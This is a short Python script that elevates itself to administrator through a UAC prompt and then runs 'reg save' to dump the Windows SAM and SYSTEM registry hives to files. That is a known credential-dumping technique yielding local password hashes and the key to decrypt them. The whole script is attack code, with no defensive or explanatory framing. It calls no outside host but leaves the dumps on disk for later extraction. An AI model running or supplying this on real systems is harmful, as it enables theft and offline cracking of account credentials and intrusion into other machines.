from os import system
import pyuac


def main():
    system("reg save HKLM\\sam sam.save")
    system("reg save HKLM\\system system.save")


if __name__ == "__main__":
    if not pyuac.isUserAdmin():
        pyuac.runAsAdmin()
    else:
        main()
